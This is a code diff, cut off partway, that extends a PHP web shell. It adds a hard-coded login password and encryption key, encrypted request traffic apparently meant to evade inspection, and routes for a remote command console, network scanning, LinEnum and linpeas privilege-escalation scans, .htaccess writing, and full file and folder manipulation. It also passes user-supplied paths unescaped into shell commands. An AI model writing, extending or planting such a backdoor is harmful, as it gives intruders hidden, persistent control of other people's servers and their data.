@@ -1,20 +1,157 @@
 <?php
-    function unhex($y)
-    {
-        // $n = '';
-        // for ($i = 0; $i < strlen($y) - 1; $i += 2) {
-        //     $n .= chr(hexdec($y[$i] . $y[$i + 1]));
-        // }
-        // return $n;
-        return $y;
+    session_start();
+    
+    $_password = 'P@ssw0rd!';
+    
+    // from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())
+    $fernet_key = 'MeNuWBMrXyAfcWtqmy4iDg5Hh0fkWfvBveTfdsPqnLQ=';
+    
+    function fernet_encrypt($data) {
+        global $fernet_key;
+        $iv = random_bytes(16);
+        $encrypted = openssl_encrypt($data, 'AES-256-CBC', base64_decode($fernet_key), 0, $iv);
+        $combined = $iv . base64_decode($encrypted);
+        return base64_encode($combined);
     }
-    function hex($n)
-    {
-        // $y = '';
-        // for ($i = 0; $i < strlen($n); $i++) {
-        //     $y .= dechex(ord($n[$i]));
-        // }
-        return $n;
+    
+    function fernet_decrypt($encrypted_data) {
+        global $fernet_key;
+        $combined = base64_decode($encrypted_data);
+        $iv = substr($combined, 0, 16);
+        $encrypted = substr($combined, 16);
+        $decrypted = openssl_decrypt(base64_encode($encrypted), 'AES-256-CBC', base64_decode($fernet_key), 0, $iv);
+        return $decrypted;
+    }
+    
+    function decrypt_post_data() {
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+            $input = file_get_contents('php://input');
+            if (!empty($input)) {
+                $decrypted = fernet_decrypt($input);
+                if ($decrypted !== false) {
+                    parse_str($decrypted, $_POST);
+                }
+            }
+        }
+    }
+    
+    // 在處理請求前解密數據
+    decrypt_post_data();
+    
+    function isLoggedIn() {
+        return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+    }
+    
+    function handleLogin() {
+        global $_password;
+        
+        if (isset($_POST['password'])) {
+            $password = $_POST['password'];
+            
+            if ($password === $_password) {
+                $_SESSION['logged_in'] = true;
+                $_SESSION['login_time'] = time();
+                return true;
+            } else {
+                return false;
+            }
+        }
+        return false;
+    }
+    
+    function handleLogout() {
+        session_destroy();
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    }
+    
+    if (isset($_GET['op']) && $_GET['op'] === 'logout') {
+        handleLogout();
+    }
+    
+    if (isset($_POST['login'])) {
+        if (handleLogin()) {
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $login_error = 'Invalid password';
+        }
+    }
+
+    // 新增 API 路由處理
+    if (isLoggedIn() && $_SERVER['REQUEST_METHOD'] === 'POST') {
+        $op = $_POST['op'] ?? '';
+        
+        switch ($op) {
+            case 'upload':
+                handleFileUpload();
+                break;
+            case 'console':
+                handleConsole();
+                break;
+            case 'netscan':
+                handleNetworkScan();
+                break;
+            case 'linenum':
+                handleLinEnum();
+                break;
+            case 'linpeas':
+                handleLinpeas();
+                break;
+            case 'searchfile':
+                handleSearchFile();
+                break;
+            case 'searchcontent':
+                handleSearchContent();
+                break;
+            case 'htaccess':
+                handleHtaccess();
+                break;
+            case 'editfile':
+                handleEditFile();
+                break;
+            case 'renamefile':
+                handleRenameFile();
+                break;
+            case 'deletefile':
+                handleDeleteFile();
+                break;
+            case 'viewfile':
+                handleViewFile();
+                break;
+            case 'createfile':
+                handleCreateFile();
+                break;
+            case 'createfolder':
+                handleCreateFolder();
+                break;
+            case 'renamefolder':
+                handleRenameFolder();
+                break;
+            case 'deletefolder':
+                handleDeleteFolder();
+                break;
+            case 'zipfolder':
+                handleZipFolder();
+                break;
+            case 'zipfile':
+                handleZipFile();
+                break;
+            case 'downloadfile':
+                handleDownloadFile();
+                break;
+            case 'downloadfolder':
+                handleDownloadFolder();
+                break;
+            // 可以在此添加其他 API 操作
+            default:
+                if (!empty($op)) {
+                    http_response_code(400);
+                    echo json_encode(['error' => 'Invalid operation']);
+                    exit;
+                }
+                break;
+        }
     }
 
     function writable($dir, $permit) {
@@ -108,26 +245,30 @@
     {
         if (is_dir($dir)) {
             if ($dh = opendir($dir)) {
-                echo "<table class='table mt-3' style='border-collapse: collapse;'>";
+                echo "<div class='md-card mt-3'>";
+                echo "<table class='md-table w-100'>";
                 echo "<thead><tr>
-                    <th class='text-center'>Filename</th>
-                    <th class='text-center'>Type</th>
-                    <th class='text-center'>Last Modified</th>
-                    <th class='text-center'>Size</th>
-                    <th class='text-center'>Owner/Group</th>
-                    <th class='text-center'>Permission</th>
-                    <th class='text-center'>Action</th>
+                    <th class='text-center'><i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>description</i>Filename</th>
+                    <th class='text-center'><i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>category</i>Type</th>
+                    <th class='text-center'><i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>schedule</i>Last Modified</th>
+                    <th class='text-center'><i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>storage</i>Size</th>
+                    <th class='text-center'><i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>person</i>Owner/Group</th>
+                    <th class='text-center'><i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>security</i>Permission</th>
+                    <th class='text-center'><i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>build</i>Action</th>
                 </tr></thead><tbody>";
+                // 加密父目錄路徑
+                $parent_path = dirname(getcwd());
+                $encrypted_parent = fernet_encrypt($parent_path);
                 echo "<tr>
-                    <td class='text-center'><a href='?path=" . getcwd() . "/..'>..</a></td>
+                    <td class='text-center'><a href='?0=" . urlencode($encrypted_parent) . "'>..</a></td>
                     <td class='text-center'>-</td>
                     <td class='text-center'>-</td>
                     <td class='text-center'>-</td>
                     <td class='text-center'>-</td>
                     <td class='text-center'>-</td>
                     <td class='text-center'>
-                        <button class='btn btn-sm btn-outline-primary'><i class='bi bi-file-earmark-plus-fill'></i></button>
-                        <button class='btn btn-sm btn-outline-primary'><i class='bi bi-folder-plus'></i></button>
+                        <button class='btn btn-sm btn-outline-primary' onclick='showCreateFile()'><i class='bi bi-file-earmark-plus-fill'></i></button>
+                        <button class='btn btn-sm btn-outline-primary' onclick='showCreateFolder()'><i class='bi bi-folder-plus'></i></button>
                     </td>
                 </tr>";
                 while (($file = readdir($dh)) !== false) {
@@ -140,7 +281,15 @@
                         $group = posix_getgrgid(filegroup($filepath))['name'];
                         $permissions = writable($filepath, get_permit($filepath));
                         echo "<tr>
-                            <td class='text-center'>{$file}</td>
+                            <td class='text-center'>";
+                        if ($filetype == 'dir') {
+                            $folder_path = $dir . '/' . $file;
+                            $encrypted_folder_path = fernet_encrypt($folder_path);
+                            echo "<a href='?0=" . urlencode($encrypted_folder_path) . "'>{$file}</a>";
+                        } else {
+                            echo "{$file}";
+                        }
+                        echo "</td>
                             <td class='text-center'>{$filetype}</td>
                             <td class='text-center'>{$lastEdit}</td>
                             <td class='text-center'>{$size}</td>
@@ -148,26 +297,29 @@
                             <td class='text-center'>{$permissions}</td>
                             <td class='text-center'>";
                         if ($filetype == 'dir') {
-                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-pencil-fill'></i></button> ";
-                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-file-zip-fill'></i></button> ";
-                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-download'></i></button> ";
-                            echo "<button class='btn btn-sm btn-outline-danger'><i class='bi bi-trash-fill'></i></button>";
+                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='showRenameFolder(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>edit</i></button> ";
+                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='showZipFolder(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>archive</i></button> ";
+                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='downloadFolder(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>download</i></button> ";
+                            echo "<button class='md-btn md-btn-danger' style='padding: 6px 12px; margin: 2px;' onclick='showDeleteFolder(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>delete</i></button>";
                         } else {
-                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-eye-fill'></i></button> ";
-                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-pencil-square'></i></button> ";
-                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-pencil-fill'></i></button> ";
-                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-file-zip-fill'></i></button> ";
-                            echo "<button class='btn btn-sm btn-outline-secondary'><i class='bi bi-download'></i></button> ";
-                            echo "<button class='btn btn-sm btn-outline-danger'><i class='bi bi-trash-fill'></i></button>";
+                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='showViewFile(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>visibility</i></button> ";
+                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='showEditFile(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>edit</i></button> ";
+                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='showRenameFile(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>drive_file_rename_outline</i></button> ";
+                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='showZipFile(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>archive</i></button> ";
+                            echo "<button class='md-btn md-btn-secondary' style='padding: 6px 12px; margin: 2px;' onclick='downloadFile(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>download</i></button> ";
+                            echo "<button class='md-btn md-btn-danger' style='padding: 6px 12px; margin: 2px;' onclick='showDeleteFile(\"" . htmlspecialchars($filepath) . "\")'><i class='material-icons' style='font-size: 16px;'>delete</i></button>";
                         }
                         echo "</td></tr>";
                     }
                 }
                 echo "</tbody></table>";
+                echo "</div>";
                 closedir($dh);
             }
         } else {
-            echo "<p>Invalid directory: {$dir}</p>";
+            echo "<div class='md-card p-3'>";
+            echo "<p class='text-center text-muted mb-0'>Invalid directory: {$dir}</p>";
+            echo "</div>";
         }
     }
 
@@ -177,11 +329,11 @@
             <div class='upload-content'>";
         if($content === null){
             echo "<form action='?' method='post' enctype='multipart/form-data'>
-                    <h3>上傳文件</h3>
+                    <h3>Upload File</h3>
                     <input type='file' name='fileToUpload' id='fileToUpload'>
                     <br><br>
-                    <input type='submit' value='上傳文件' name='submit' class='btn btn-primary'>
-                    <button type='button' class='btn btn-secondary' onclick='hideUploadInterface();'>取消</button>
+                    <input type='submit' value='Upload File' name='submit' class='btn btn-primary'>
+                    <button type='button' class='btn btn-secondary' onclick='hideUploadInterface();'>Cancel</button>
                 </form>";
         }
         echo"
@@ -202,8 +354,8 @@
                 <div id="consoleOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                 <div id="consoleForm">
                     <div class="d-flex">
-                        <input type="text" class="form-control bg-secondary text-light me-2" id="cmdInput" placeholder="輸入命令">
-                        <button class="btn btn-outline-light" type="button" onclick="executeCommand()">執行</button>
+                        <input type="text" class="form-control bg-secondary text-light me-2" id="cmdInput" placeholder="Enter command">
+                        <button class="btn btn-outline-light" type="button" onclick="executeCommand()">Execute</button>
                     </div>
                 </div>
             </div>
@@ -227,7 +379,7 @@
             <div id="networkScanContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                 <div id="networkScanOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                 <div class="d-flex">
-                    <button class="btn btn-outline-light" style="width: 100%;" type="button" onclick="executeNetworkScan()">執行 Network Scan</button>
+                    <button class="btn btn-outline-light" style="width: 100%;" type="button" onclick="executeNetworkScan()">Execute Network Scan</button>
                 </div>
             </div>
             ';
@@ -252,7 +404,7 @@
             <div id="linEnumContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                 <div id="linEnumOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                 <div class="d-flex">
-                    <button class="btn btn-outline-light" style="width: 100%;" type="button" onclick="executeLinEnum()">執行 LinEnum</button>
+                    <button class="btn btn-outline-light" style="width: 100%;" type="button" onclick="executeLinEnum()">Execute LinEnum</button>
                 </div>
             </div>
             ';
@@ -277,7 +429,7 @@
             <div id="linpeasContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
                 <div id="linpeasOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                 <div class="d-flex">
-                    <button class="btn btn-outline-light" style="width: 100%;" type="button" onclick="executeLinpeas()">執行 Linpeas</button>
+                    <button class="btn btn-outline-light" style="width: 100%;" type="button" onclick="executeLinpeas()">Execute Linpeas</button>
                 </div>
             </div>
             ';
@@ -287,7 +439,7 @@
     function handleSearchFile() {
         if(isset($_POST['filename'])) {
             $filename = $_POST['filename'];
-            $path = isset($_POST['path']) ? unhex($_POST['path']) : '.';
+            $path = isset($_POST['path']) ? $_POST['path'] : '.';
             $command = "find '$path' -name '*$filename*'";
             $output = exe($command);
             echo json_encode(['output' => htmlspecialchars($output, ENT_QUOTES, 'UTF-8')]);
@@ -297,8 +449,8 @@
                 <div id="searchFileOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                 <div id="searchFileForm">
                     <div class="d-flex">
-                        <input type="text" class="form-control bg-secondary text-light me-2" id="filenameInput" placeholder="輸入文件名" style="width: calc(100% - 100px);">
-                        <button class="btn btn-outline-light" style="width: 90px;" type="button" onclick="searchFile()">搜索</button>
+                        <input type="text" class="form-control bg-secondary text-light me-2" id="filenameInput" placeholder="Enter filename" style="width: calc(100% - 100px);">
+                        <button class="btn btn-outline-light" style="width: 90px;" type="button" onclick="searchFile()">Search</button>
                     </div>
                 </div>
             </div>
@@ -309,7 +461,7 @@
     function handleSearchContent() {
         if(isset($_POST['content'])) {
             $content = $_POST['content'];
-            $path = isset($_POST['path']) ? unhex($_POST['path']) : '.';
+            $path = isset($_POST['path']) ? $_POST['path'] : '.';
             $command = "grep -r '$content' '$path'";
             $output = exe($command);
             echo json_encode(['output' => htmlspecialchars($output, ENT_QUOTES, 'UTF-8')]);
@@ -319,8 +471,8 @@
                 <div id="searchContentOutput" class="mb-3" style="height: 300px; overflow-y: auto; border: 1px solid #444; padding: 10px;"></div>
                 <div id="searchContentForm">
                     <div class="d-flex">
-                        <input type="text" class="form-control bg-secondary text-light me-2" id="contentInput" placeholder="輸入搜索內容" style="width: calc(100% - 100px);">
-                        <button class="btn btn-outline-light" style="width: 90px;" type="button" onclick="searchContent()">搜索</button>
+                        <input type="text" class="form-control bg-secondary text-light me-2" id="contentInput" placeholder="Enter search content" style="width: calc(100% - 100px);">
+                        <button class="btn btn-outline-light" style="width: 90px;" type="button" onclick="searchContent()">Search</button>
                     </div>
                 </div>
             </div>
@@ -329,7 +481,7 @@
     }
 
     function handleHtaccess() {
-        $path = isset($_POST['path']) ? unhex($_POST['path']) : getcwd();
+        $path = isset($_POST['path']) ? $_POST['path'] : getcwd();
         
         if(isset($_POST['content'])) {
             $content = $_POST['content'];
@@ -338,7 +490,7 @@
             if (file_put_contents($htaccessPath, $content) !== false) {
                 echo json_encode(['success' => true]);
             } else {
-                echo json_encode(['success' => false, 'error' => '無法創建.htaccess文件']);
+                echo json_encode(['success' => false, 'error' => 'Unable to create .htaccess file']);
             }
         } else {
             // 預設的.htaccess範本
@@ -361,7 +513,7 @@
                 <div class="mb-3">
                     <textarea id="htaccessContent" class="form-control bg-secondary text-light" 
                         style="height: 300px; resize: none;" 
-                        placeholder="輸入.htaccess內容...">' . htmlspecialchars($defaultContent) . '</textarea>
+                        placeholder="Enter .htaccess content...">' . htmlspecialchars($defaultContent) . '</textarea>
                 </div>
                 <div class="d-flex justify-content-center">
                     <button class="btn btn-outline-light" 
@@ -374,45 +526,509 @@
         }
     }
 
-    // 新增 API 路由處理
-    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        $op = $_POST['op'] ?? '';
-        
-        switch ($op) {
-            case 'upload':
-                handleFileUpload();
-                break;
-            case 'console':
-                handleConsole();
-                break;
-            case 'netscan':
-                handleNetworkScan();
-                break;
-            case 'linenum':
-                handleLinEnum();
-                break;
-            case 'linpeas':
-                handleLinpeas();
-                break;
-            case 'searchfile':
-                handleSearchFile();
-                break;
-            case 'searchcontent':
-                handleSearchContent();
-                break;
-            case 'htaccess':
-                handleHtaccess();
-                break;
-            // 可以在此添加其他 API 操作
-            default:
-                http_response_code(400);
-                echo json_encode(['error' => '無效的操作']);
-                break;
+    function handleEditFile() {
+        if(isset($_POST['filename']) && isset($_POST['content'])) {
+            $filename = $_POST['filename'];
+            $content = $_POST['content'];
+            
+            if (file_put_contents($filename, $content) !== false) {
+                echo json_encode(['success' => true, 'message' => 'File edited successfully']);
+            } else {
+                echo json_encode(['success' => false, 'error' => 'Unable to edit file']);
+            }
+        } else {
+            $filename = $_POST['filename'] ?? '';
+            if (file_exists($filename) && is_readable($filename)) {
+                $content = file_get_contents($filename);
+                echo '
+                <div id="editFileContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
+                    <div class="mb-3">
+                        <h5>Edit File: ' . htmlspecialchars(basename($filename)) . '</h5>
+                        <textarea id="editFileContent" class="form-control bg-secondary text-light" 
+                            style="height: 400px; resize: none;" 
+                            placeholder="File content...">' . htmlspecialchars($content) . '</textarea>
+                    </div>
+                    <div class="d-flex justify-content-center gap-2">
+                        <button class="btn btn-outline-secondary" 
+                            style="min-width: 100px; padding: 8px 20px;" 
+                            type="button" 
+                            onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
+                        <button class="btn btn-outline-primary" 
+                            style="min-width: 100px; padding: 8px 20px;" 
+                            type="button" 
+                            onclick="saveFileEdit(\'' . htmlspecialchars($filename) . '\')">Save</button>
+                    </div>
+                </div>
+                ';
+            } else {
+                echo json_encode(['success' => false, 'error' => 'File does not exist or cannot be read']);
+            }
         }
-        exit;
     }
 
-    // 修改 handleFileUpload 函數
+    function handleRenameFile() {
+        if(isset($_POST['oldname']) && isset($_POST['newname'])) {
+            $oldname = $_POST['oldname'];
+            $newname = $_POST['newname'];
+            
+            if (file_exists($oldname)) {
+                // 確保新文件名包含正確的路徑
+                $dirname = dirname($oldname);
+                $newpath = $dirname . '/' . basename($newname);
+                
+                if (rename($oldname, $newpath)) {
+                                    echo json_encode(['success' => true, 'message' => 'File renamed successfully']);
+            } else {
+                echo json_encode(['success' => false, 'error' => 'Unable to rename file']);
+                }
+            } else {
+                echo json_encode(['success' => false, 'error' => 'Original file does not exist']);
+            }
+        } else {
+            $filename = $_POST['filename'] ?? '';
+            if (file_exists($filename)) {
+                echo '
+                <div id="renameFileContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
+                    <div class="mb-3">
+                        <h5>Rename File</h5>
+                        <p>Original filename: ' . htmlspecialchars(basename($filename)) . '</p>
+                        <input type="text" id="newFileName" class="form-control bg-secondary text-light" 
+                            value="' . htmlspecialchars(basename($filename)) . '" 
+                            placeholder="New filename">
+                    </div>
+                    <div class="d-flex justify-content-center gap-2">
+                        <button class="btn btn-outline-secondary" 
+                            style="min-width: 100px; padding: 8px 20px;" 
+                            type="button" 
+                            onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
+                        <button class="btn btn-outline-primary" 
+                            style="min-width: 100px; padding: 8px 20px;" 
+                            type="button" 
+                            onclick="saveFileRename(\'' . htmlspecialchars($filename) . '\')">Rename</button>
+                    </div>
+                </div>
+                ';
+            } else {
+                echo json_encode(['success' => false, 'error' => 'File does not exist']);
+            }
+        }
+    }
+
+    function handleDeleteFile() {
+        if(isset($_POST['filename']) && isset($_POST['confirm'])) {
+            $filename = $_POST['filename'];
+            
+            if (file_exists($filename)) {
+                if (unlink($filename)) {
+                                    echo json_encode(['success' => true, 'message' => 'File deleted successfully']);
+            } else {
+                echo json_encode(['success' => false, 'error' => 'Unable to delete file']);
+            }
+        } else {
+            echo json_encode(['success' => false, 'error' => 'File does not exist']);
+            }
+        } else {
+            $filename = $_POST['filename'] ?? '';
+            if (file_exists($filename)) {
+                echo '
+                <div id="deleteFileContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
+                    <div class="mb-3">
+                        <h5>Confirm Delete</h5>
+                        <p>Are you sure you want to delete file: <strong>' . htmlspecialchars(basename($filename)) . '</strong>?</p>
+                        <p class="text-warning">This action cannot be undone!</p>
+                    </div>
+                    <div class="d-flex justify-content-center gap-2">
+                        <button class="btn btn-outline-secondary" 
+                            style="min-width: 100px; padding: 8px 20px;" 
+                            type="button" 
+                            onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
+                        <button class="btn btn-outline-danger" 
+                            style="min-width: 100px; padding: 8px 20px;" 
+                            type="button" 
+                            onclick="confirmDeleteFile(\'' . htmlspecialchars($filename) . '\')">Confirm Delete</button>
+                    </div>
+                </div>
+                ';
+            } else {
+                echo json_encode(['success' => false, 'error' => 'File does not exist']);
+            }
+        }
+    }
+
+    function handleViewFile() {
+        $filename = $_POST['filename'] ?? '';
+        if (file_exists($filename) && is_readable($filename)) {
+            $content = file_get_contents($filename);
+            echo '
+            <div id="viewFileContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
+                <div class="mb-3">
+                                            <h5>View File: ' . htmlspecialchars(basename($filename)) . '</h5>
+                        <textarea id="viewFileContent" class="form-control bg-secondary text-light" 
+                            style="height: 400px; resize: none;" 
+                            readonly placeholder="File content...">' . htmlspecialchars($content) . '</textarea>
+                </div>
+                <div class="d-flex justify-content-center gap-2">
+                    <button class="btn btn-outline-secondary" 
+                        style="min-width: 100px; padding: 8px 20px;" 
+                        type="button" 
+                                                    onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Close</button>
+                </div>
+            </div>
+            ';
+        } else {
+            echo json_encode(['success' => false, 'error' => 'File does not exist or cannot be read']);
+        }
+    }
+
+    function handleCreateFile() {
+        if(isset($_POST['filename']) && isset($_POST['content'])) {
+            $filename = $_POST['filename'];
+            $content = $_POST['content'];
+            
+            if (file_put_contents($filename, $content) !== false) {
+                echo json_encode(['success' => true, 'message' => 'File created successfully']);
+            } else {
+                echo json_encode(['success' => false, 'error' => 'Unable to create file']);
+            }
+        } else {
+            echo '
+            <div id="createFileContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
+                <div class="mb-3">
+                    <h5>Create New File</h5>
+                    <input type="text" id="newFileName" class="form-control bg-secondary text-light mb-3" 
+                        placeholder="Filename">
+                    <textarea id="newFileContent" class="form-control bg-secondary text-light" 
+                        style="height: 300px; resize: none;" 
+                        placeholder="File content..."></textarea>
+                </div>
+                <div class="d-flex justify-content-center gap-2">
+                    <button class="btn btn-outline-secondary" 
+                        style="min-width: 100px; padding: 8px 20px;" 
+                        type="button" 
+                                                    onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
+                    <button class="btn btn-outline-primary" 
+                        style="min-width: 100px; padding: 8px 20px;" 
+                        type="button" 
+                        onclick="createNewFile()">Create</button>
+                </div>
+            </div>
+            ';
+        }
+    }
+
+    function handleCreateFolder() {
+        if(isset($_POST['foldername'])) {
+            $foldername = $_POST['foldername'];
+            
+            if (mkdir($foldername, 0755, true)) {
+                echo json_encode(['success' => true, 'message' => 'Folder created successfully']);
+            } else {
+                echo json_encode(['success' => false, 'error' => 'Unable to create folder']);
+            }
+        } else {
+            echo '
+            <div id="createFolderContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
+                <div class="mb-3">
+                    <h5>Create New Folder</h5>
+                    <input type="text" id="newFolderName" class="form-control bg-secondary text-light" 
+                        placeholder="Folder name">
+                </div>
+                <div class="d-flex justify-content-center gap-2">
+                    <button class="btn btn-outline-secondary" 
+                        style="min-width: 100px; padding: 8px 20px;" 
+                        type="button" 
+                                                    onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
+                    <button class="btn btn-outline-primary" 
+                        style="min-width: 100px; padding: 8px 20px;" 
+                        type="button" 
+                        onclick="createNewFolder()">Create</button>
+                </div>
+            </div>
+            ';
+        }
+    }
+
+    function handleRenameFolder() {
+        if(isset($_POST['oldname']) && isset($_POST['newname'])) {
+            $oldname = $_POST['oldname'];
+            $newname = $_POST['newname'];
+            
+            if (is_dir($oldname)) {
+                // 確保新資料夾名包含正確的路徑
+                $dirname = dirname($oldname);
+                $newpath = $dirname . '/' . basename($newname);
+                
+                if (rename($oldname, $newpath)) {
+                                    echo json_encode(['success' => true, 'message' => 'Folder renamed successfully']);
+            } else {
+                echo json_encode(['success' => false, 'error' => 'Unable to rename folder']);
+            }
+        } else {
+            echo json_encode(['success' => false, 'error' => 'Original folder does not exist']);
+            }
+        } else {
+            $foldername = $_POST['foldername'] ?? '';
+            if (is_dir($foldername)) {
+                echo '
+                <div id="renameFolderContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
+                    <div class="mb-3">
+                        <h5>Rename Folder</h5>
+                        <p>Original folder name: ' . htmlspecialchars(basename($foldername)) . '</p>
+                        <input type="text" id="newFolderName" class="form-control bg-secondary text-light" 
+                            value="' . htmlspecialchars(basename($foldername)) . '" 
+                            placeholder="New folder name">
+                    </div>
+                    <div class="d-flex justify-content-center gap-2">
+                        <button class="btn btn-outline-secondary" 
+                            style="min-width: 100px; padding: 8px 20px;" 
+                            type="button" 
+                            onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
+                        <button class="btn btn-outline-primary" 
+                            style="min-width: 100px; padding: 8px 20px;" 
+                            type="button" 
+                            onclick="saveFolderRename(\'' . htmlspecialchars($foldername) . '\')">Rename</button>
+                    </div>
+                </div>
+                ';
+            } else {
+                echo json_encode(['success' => false, 'error' => 'Folder does not exist']);
+            }
+        }
+    }
+
+    function handleDeleteFolder() {
+        if(isset($_POST['foldername']) && isset($_POST['confirm'])) {
+            $foldername = $_POST['foldername'];
+            
+            if (is_dir($foldername)) {
+                // 遞歸刪除資料夾
+                function deleteDirectory($dir) {
+                    if (!is_dir($dir)) {
+                        return false;
+                    }
+                    
+                    $files = array_diff(scandir($dir), array('.', '..'));
+                    foreach ($files as $file) {
+                        $path = $dir . DIRECTORY_SEPARATOR . $file;
+                        if (is_dir($path)) {
+                            deleteDirectory($path);
+                        } else {
+                            unlink($path);
+                        }
+                    }
+                    return rmdir($dir);
+                }
+                
+                if (deleteDirectory($foldername)) {
+                                    echo json_encode(['success' => true, 'message' => 'Folder deleted successfully']);
+            } else {
+                echo json_encode(['success' => false, 'error' => 'Unable to delete folder']);
+            }
+        } else {
+            echo json_encode(['success' => false, 'error' => 'Folder does not exist']);
+            }
+        } else {
+            $foldername = $_POST['foldername'] ?? '';
+            if (is_dir($foldername)) {
+                echo '
+                <div id="deleteFolderContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
+                    <div class="mb-3">
+                        <h5>Confirm Delete Folder</h5>
+                        <p>Are you sure you want to delete folder: <strong>' . htmlspecialchars(basename($foldername)) . '</strong>?</p>
+                        <p class="text-warning">This action will delete all files in the folder and cannot be undone!</p>
+                    </div>
+                    <div class="d-flex justify-content-center gap-2">
+                        <button class="btn btn-outline-secondary" 
+                            style="min-width: 100px; padding: 8px 20px;" 
+                            type="button" 
+                            onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
+                        <button class="btn btn-outline-danger" 
+                            style="min-width: 100px; padding: 8px 20px;" 
+                            type="button" 
+                            onclick="confirmDeleteFolder(\'' . htmlspecialchars($foldername) . '\')">Confirm Delete</button>
+                    </div>
+                </div>
+                ';
+            } else {
+                echo json_encode(['success' => false, 'error' => 'Folder does not exist']);
+            }
+        }
+    }
+
+    function handleZipFolder() {
+        if(isset($_POST['foldername']) && isset($_POST['confirm'])) {
+            $foldername = $_POST['foldername'];
+            $zipname = $_POST['zipname'] ?? basename($foldername) . '.zip';
+            
+            if (is_dir($foldername)) {
+                $zipPath = dirname($foldername) . '/' . $zipname;
+                
+                // 使用 bash zip 命令
+                $command = "zip -r '" . $zipPath . "' '" . $foldername . "'";
+                $output = exe($command);
+                
+                if (file_exists($zipPath)) {
+                    echo json_encode(['success' => true, 'message' => 'Folder compressed successfully', 'zipfile' => $zipname]);
+                } else {
+                    echo json_encode(['success' => false, 'error' => 'Compressed file creation failed: ' . $output]);
+                }
+            } else {
+                echo json_encode(['success' => false, 'error' => 'Folder does not exist']);
+            }
+        } else {
+            $foldername = $_POST['foldername'] ?? '';
+            if (is_dir($foldername)) {
+                $defaultZipName = basename($foldername) . '.zip';
+                echo '
+                <div id="zipFolderContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
+                    <div class="mb-3">
+                        <h5>Folder Compression</h5>
+                        <p>Folder: <strong>' . htmlspecialchars(basename($foldername)) . '</strong></p>
+                        <input type="text" id="zipFileName" class="form-control bg-secondary text-light mb-3" 
+                            value="' . htmlspecialchars($defaultZipName) . '" 
+                            placeholder="ZIP File Name">
+                        <p class="text-info">This operation will create a ZIP archive containing all files inside the folder.</p>
+                    </div>
+                    <div class="d-flex justify-content-center gap-2">
+                        <button class="btn btn-outline-secondary" 
